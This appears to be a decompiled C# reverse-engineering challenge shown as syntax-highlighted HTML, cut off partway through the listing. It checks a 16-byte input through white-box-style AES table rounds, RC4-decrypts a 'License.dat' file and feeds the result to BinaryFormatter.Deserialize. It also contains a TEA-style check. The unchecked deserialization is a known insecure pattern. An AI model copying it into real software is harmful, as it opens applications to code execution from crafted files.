<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        BBB();</span><br><span class="line">        <span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">16</span>];</span><br><span class="line">        <span class="built_in">byte</span>[] array2 = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">16</span>];</span><br><span class="line">        <span class="built_in">byte</span>[] array3 = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">16</span>];</span><br><span class="line">        AAA(v31, array2);</span><br><span class="line">        Array.Clear(array, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        AAA(array, array3);</span><br><span class="line">        <span class="keyword">if</span> (!CCC(v4, array2, <span class="number">16</span>) || !CCC(v5, array3, <span class="number">16</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            Environment.Exit(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v7 = DDD(<span class="string">&quot;License.dat&quot;</span>);</span><br><span class="line">        EEE(Encoding.UTF8.GetBytes(v6), v7);</span><br><span class="line">        MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream(v7);</span><br><span class="line">        BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">        memoryStream.Position = <span class="number">0L</span>;</span><br><span class="line">        binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">        memoryStream.Close();</span><br><span class="line">        Console.WriteLine(Encoding.UTF8.GetString(v10));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">BBB</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    v6 = Console.ReadLine();</span><br><span class="line">    <span class="built_in">byte</span>[] bytes = Encoding.UTF8.GetBytes(v6);</span><br><span class="line">    <span class="keyword">if</span> (bytes.Length == <span class="number">16</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        bytes.CopyTo(v31, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Environment.Exit(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">AAA</span>(<span class="params"><span class="built_in">byte</span>[] aaa, <span class="built_in">byte</span>[] bbb</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        GGG(aaa);</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">uint</span> num = v11[i, <span class="number">4</span> * j, aaa[<span class="number">4</span> * j]];</span><br><span class="line">            <span class="built_in">uint</span> num2 = v11[i, <span class="number">4</span> * j + <span class="number">1</span>, aaa[<span class="number">4</span> * j + <span class="number">1</span>]];</span><br><span class="line">            <span class="built_in">uint</span> num3 = v11[i, <span class="number">4</span> * j + <span class="number">2</span>, aaa[<span class="number">4</span> * j + <span class="number">2</span>]];</span><br><span class="line">            <span class="built_in">uint</span> num4 = v11[i, <span class="number">4</span> * j + <span class="number">3</span>, aaa[<span class="number">4</span> * j + <span class="number">3</span>]];</span><br><span class="line">            <span class="built_in">uint</span> num5 = v12[i, <span class="number">24</span> * j, (num &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xF</span>, (num2 &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            <span class="built_in">uint</span> num6 = v12[i, <span class="number">24</span> * j + <span class="number">1</span>, (num3 &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xF</span>, (num4 &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            <span class="built_in">uint</span> num7 = v12[i, <span class="number">24</span> * j + <span class="number">2</span>, (num &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>, (num2 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            <span class="built_in">uint</span> num8 = v12[i, <span class="number">24</span> * j + <span class="number">3</span>, (num3 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>, (num4 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            aaa[<span class="number">4</span> * j] = (<span class="built_in">byte</span>)((v12[i, <span class="number">24</span> * j + <span class="number">4</span>, num5, num6] &lt;&lt; <span class="number">4</span>) | v12[i, <span class="number">24</span> * j + <span class="number">5</span>, num7, num8]);</span><br><span class="line">            num5 = v12[i, <span class="number">24</span> * j + <span class="number">6</span>, (num &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>, (num2 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num6 = v12[i, <span class="number">24</span> * j + <span class="number">7</span>, (num3 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>, (num4 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num7 = v12[i, <span class="number">24</span> * j + <span class="number">8</span>, (num &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xF</span>, (num2 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num8 = v12[i, <span class="number">24</span> * j + <span class="number">9</span>, (num3 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xF</span>, (num4 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            aaa[<span class="number">4</span> * j + <span class="number">1</span>] = (<span class="built_in">byte</span>)((v12[i, <span class="number">24</span> * j + <span class="number">10</span>, num5, num6] &lt;&lt; <span class="number">4</span>) | v12[i, <span class="number">24</span> * j + <span class="number">11</span>, num7, num8]);</span><br><span class="line">            num5 = v12[i, <span class="number">24</span> * j + <span class="number">12</span>, (num &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xF</span>, (num2 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num6 = v12[i, <span class="number">24</span> * j + <span class="number">13</span>, (num3 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xF</span>, (num4 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num7 = v12[i, <span class="number">24</span> * j + <span class="number">14</span>, (num &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span>, (num2 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num8 = v12[i, <span class="number">24</span> * j + <span class="number">15</span>, (num3 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span>, (num4 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            aaa[<span class="number">4</span> * j + <span class="number">2</span>] = (<span class="built_in">byte</span>)((v12[i, <span class="number">24</span> * j + <span class="number">16</span>, num5, num6] &lt;&lt; <span class="number">4</span>) | v12[i, <span class="number">24</span> * j + <span class="number">17</span>, num7, num8]);</span><br><span class="line">            num5 = v12[i, <span class="number">24</span> * j + <span class="number">18</span>, (num &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>, (num2 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num6 = v12[i, <span class="number">24</span> * j + <span class="number">19</span>, (num3 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>, (num4 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num7 = v12[i, <span class="number">24</span> * j + <span class="number">20</span>, num &amp; <span class="number">0xF</span>, num2 &amp; <span class="number">0xF</span>];</span><br><span class="line">            num8 = v12[i, <span class="number">24</span> * j + <span class="number">21</span>, num3 &amp; <span class="number">0xF</span>, num4 &amp; <span class="number">0xF</span>];</span><br><span class="line">            aaa[<span class="number">4</span> * j + <span class="number">3</span>] = (<span class="built_in">byte</span>)((v12[i, <span class="number">24</span> * j + <span class="number">22</span>, num5, num6] &lt;&lt; <span class="number">4</span>) | v12[i, <span class="number">24</span> * j + <span class="number">23</span>, num7, num8]);</span><br><span class="line">            num = v13[i, <span class="number">4</span> * j, aaa[<span class="number">4</span> * j]];</span><br><span class="line">            num2 = v13[i, <span class="number">4</span> * j + <span class="number">1</span>, aaa[<span class="number">4</span> * j + <span class="number">1</span>]];</span><br><span class="line">            num3 = v13[i, <span class="number">4</span> * j + <span class="number">2</span>, aaa[<span class="number">4</span> * j + <span class="number">2</span>]];</span><br><span class="line">            num4 = v13[i, <span class="number">4</span> * j + <span class="number">3</span>, aaa[<span class="number">4</span> * j + <span class="number">3</span>]];</span><br><span class="line">            num5 = v12[i, <span class="number">24</span> * j, (num &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xF</span>, (num2 &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num6 = v12[i, <span class="number">24</span> * j + <span class="number">1</span>, (num3 &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xF</span>, (num4 &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num7 = v12[i, <span class="number">24</span> * j + <span class="number">2</span>, (num &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>, (num2 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num8 = v12[i, <span class="number">24</span> * j + <span class="number">3</span>, (num3 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>, (num4 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            aaa[<span class="number">4</span> * j] = (<span class="built_in">byte</span>)((v12[i, <span class="number">24</span> * j + <span class="number">4</span>, num5, num6] &lt;&lt; <span class="number">4</span>) | v12[i, <span class="number">24</span> * j + <span class="number">5</span>, num7, num8]);</span><br><span class="line">            num5 = v12[i, <span class="number">24</span> * j + <span class="number">6</span>, (num &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>, (num2 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num6 = v12[i, <span class="number">24</span> * j + <span class="number">7</span>, (num3 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>, (num4 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num7 = v12[i, <span class="number">24</span> * j + <span class="number">8</span>, (num &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xF</span>, (num2 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num8 = v12[i, <span class="number">24</span> * j + <span class="number">9</span>, (num3 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xF</span>, (num4 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            aaa[<span class="number">4</span> * j + <span class="number">1</span>] = (<span class="built_in">byte</span>)((v12[i, <span class="number">24</span> * j + <span class="number">10</span>, num5, num6] &lt;&lt; <span class="number">4</span>) | v12[i, <span class="number">24</span> * j + <span class="number">11</span>, num7, num8]);</span><br><span class="line">            num5 = v12[i, <span class="number">24</span> * j + <span class="number">12</span>, (num &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xF</span>, (num2 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num6 = v12[i, <span class="number">24</span> * j + <span class="number">13</span>, (num3 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xF</span>, (num4 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num7 = v12[i, <span class="number">24</span> * j + <span class="number">14</span>, (num &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span>, (num2 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num8 = v12[i, <span class="number">24</span> * j + <span class="number">15</span>, (num3 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span>, (num4 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            aaa[<span class="number">4</span> * j + <span class="number">2</span>] = (<span class="built_in">byte</span>)((v12[i, <span class="number">24</span> * j + <span class="number">16</span>, num5, num6] &lt;&lt; <span class="number">4</span>) | v12[i, <span class="number">24</span> * j + <span class="number">17</span>, num7, num8]);</span><br><span class="line">            num5 = v12[i, <span class="number">24</span> * j + <span class="number">18</span>, (num &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>, (num2 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num6 = v12[i, <span class="number">24</span> * j + <span class="number">19</span>, (num3 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>, (num4 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>];</span><br><span class="line">            num7 = v12[i, <span class="number">24</span> * j + <span class="number">20</span>, num &amp; <span class="number">0xF</span>, num2 &amp; <span class="number">0xF</span>];</span><br><span class="line">            num8 = v12[i, <span class="number">24</span> * j + <span class="number">21</span>, num3 &amp; <span class="number">0xF</span>, num4 &amp; <span class="number">0xF</span>];</span><br><span class="line">            aaa[<span class="number">4</span> * j + <span class="number">3</span>] = (<span class="built_in">byte</span>)((v12[i, <span class="number">24</span> * j + <span class="number">22</span>, num5, num6] &lt;&lt; <span class="number">4</span>) | v12[i, <span class="number">24</span> * j + <span class="number">23</span>, num7, num8]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    GGG(aaa);</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        aaa[k] = v14[<span class="number">9</span>, k, aaa[k]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> l = <span class="number">0</span>; l &lt; <span class="number">16</span>; l++)</span><br><span class="line">    &#123;</span><br><span class="line">        bbb[l] = aaa[l];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">EEE</span>(<span class="params"><span class="built_in">byte</span>[] v22, <span class="built_in">byte</span>[] v21</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span>[] array = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">int</span>[] array2 = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">byte</span>[] array3 = <span class="keyword">new</span> <span class="built_in">byte</span>[v21.Length];</span><br><span class="line">    <span class="built_in">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        array[i] = v22[i % v22.Length];</span><br><span class="line">        array2[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">int</span> num = (i = <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        num = (num + array2[i] + array[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="built_in">int</span> num2 = array2[i];</span><br><span class="line">        array2[i] = array2[num];</span><br><span class="line">        array2[num] = num2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">int</span> num3 = (num = (i = <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; v21.Length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        num3++;</span><br><span class="line">        num3 %= <span class="number">256</span>;</span><br><span class="line">        num += array2[num3];</span><br><span class="line">        num %= <span class="number">256</span>;</span><br><span class="line">        <span class="built_in">int</span> num2 = array2[num3];</span><br><span class="line">        array2[num3] = array2[num];</span><br><span class="line">        array2[num] = num2;</span><br><span class="line">        <span class="built_in">int</span> num4 = array2[(array2[num3] + array2[num]) % <span class="number">256</span>];</span><br><span class="line">        array3[i] = (<span class="built_in">byte</span>)(v21[i] ^ num4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; v21.Length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v21[i] = array3[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;	</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">int</span> <span class="title">FFF</span>(<span class="params"><span class="built_in">string</span> a, <span class="built_in">string</span> b</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (b.Length != <span class="number">21</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!v6.Equals(a))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">string</span> s = b.PadRight((b.Length / <span class="number">8</span> + ((b.Length % <span class="number">8</span> &gt; <span class="number">0</span>) ? <span class="number">1</span> : <span class="number">0</span>)) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">byte</span>[] bytes = Encoding.UTF8.GetBytes(s);</span><br><span class="line">    <span class="built_in">byte</span>[] bytes2 = Encoding.UTF8.GetBytes(a);</span><br><span class="line">    <span class="built_in">uint</span>[] array = <span class="keyword">new</span> <span class="built_in">uint</span>[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        array[i] = BitConverter.ToUInt32(bytes2, i * <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">uint</span> num = <span class="number">3735928559u</span>;</span><br><span class="line">    <span class="built_in">int</span> num2 = bytes.Length / <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">byte</span>[] array2 = <span class="keyword">new</span> <span class="built_in">byte</span>[bytes.Length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; num2; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uint</span> num3 = BitConverter.ToUInt32(bytes, j * <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">uint</span> num4 = BitConverter.ToUInt32(bytes, j * <span class="number">8</span> + <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">uint</span> num5 = <span class="number">0u</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> k = <span class="number">0</span>; k &lt; <span class="number">32</span>; k++)</span><br><span class="line">        &#123;</span><br><span class="line">            num5 += num;</span><br><span class="line">            num3 += ((num4 &lt;&lt; <span class="number">4</span>) + array[<span class="number">0</span>]) ^ (num4 + num5) ^ ((num4 &gt;&gt; <span class="number">5</span>) + array[<span class="number">1</span>]);</span><br><span class="line">            num4 += ((num3 &lt;&lt; <span class="number">4</span>) + array[<span class="number">2</span>]) ^ (num3 + num5) ^ ((num3 &gt;&gt; <span class="number">5</span>) + array[<span class="number">3</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        Array.Copy(BitConverter.GetBytes(num3), <span class="number">0</span>, array2, j * <span class="number">8</span>, <span class="number">4</span>);</span><br><span class="line">        Array.Copy(BitConverter.GetBytes(num4), <span class="number">0</span>, array2, j * <span class="number">8</span> + <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> l = <span class="number">0</span>; l &lt; array2.Length; l++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (v28[l] != array2[l])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">byte</span>[] array3 = MD5.Create().ComputeHash(v7);</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> m = <span class="number">0</span>; m &lt; v10.Length; m++)</span><br><span class="line">    &#123;</span><br><span class="line">        v10[m] ^= array3[m % array3.Length];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">CCC</span>(<span class="params"><span class="built_in">byte</span>[] a, <span class="built_in">byte</span>[] b, <span class="built_in">int</span> length</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (a.Length &lt; length || b.Length &lt; length)</span><br><span class="line">    &#123;</span><br><span class="line">        Environment.Exit(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i] != b[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">DDD</span>(<span class="params"><span class="built_in">string</span> v33</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!File.Exists(v33))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FileNotFoundException(<span class="string">&quot;&quot;</span>, v33);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">using</span> FileStream fileStream = <span class="keyword">new</span> FileStream(v33, FileMode.Open, FileAccess.Read);</span><br><span class="line">    <span class="built_in">long</span> length = fileStream.Length;</span><br><span class="line">    <span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[length];</span><br><span class="line">    <span class="keyword">if</span> (fileStream.Read(array, <span class="number">0</span>, (<span class="built_in">int</span>)length) != length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GGG</span>(<span class="params"><span class="built_in">byte</span>[] v16</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">uint</span>[] array2 = <span class="keyword">new</span> <span class="built_in">uint</span>[<span class="number">16</span>]</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0u</span>, <span class="number">5u</span>, <span class="number">10u</span>, <span class="number">15u</span>, <span class="number">4u</span>, <span class="number">9u</span>, <span class="number">14u</span>, <span class="number">3u</span>, <span class="number">8u</span>, <span class="number">13u</span>,</span><br><span class="line">        <span class="number">2u</span>, <span class="number">7u</span>, <span class="number">12u</span>, <span class="number">1u</span>, <span class="number">6u</span>, <span class="number">11u</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span 